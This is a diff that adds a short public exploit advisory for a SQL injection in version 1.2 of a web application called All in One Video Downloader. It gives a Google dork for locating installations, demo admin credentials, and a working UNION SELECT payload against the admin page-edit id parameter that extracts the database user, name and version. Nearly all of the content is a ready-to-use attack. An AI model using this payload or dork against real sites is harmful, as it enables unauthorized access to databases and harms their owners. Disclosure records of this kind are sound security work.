@@ -1,0 +1,20 @@
+# Exploit Title: All in One Video Downloader 1.2 - SQL Injection
+# Google Dork: "developed by Niche Office"
+# Date: 1 Jan 2019
+# Exploit Author: Deyaa Muhammad
+# Author EMail: contact [at] deyaa.me
+# Author Blog: http://deyaa.me
+# Vendor Homepage: https://nicheoffice.web.tr/
+# Software Link: https://codecanyon.net/item/all-in-one-video-downloader-youtube-and-more/22599418
+# Demo Website: https://aiovideodl.ml/
+# Demo Admin Panel: https://aiovideodl.ml/admin/
+# Demo Admin Credentials: demo@aiovideodl.ml/123456
+# Version: 1.2
+# Tested on: WIN7_x68/cloudflare
+# CVE : N/A
+
+# POC:
+https://[PATH]/admin/?view=page-edit&id=2.9'+[SQLI]-- -
+
+# Exploit:
+https://[PATH]/admin/?view=page-edit&id=2.9'+UNION+SELECT+1,2,3,4,concat(user(),0x3a3a,database(),0x3a3a,version())-- -
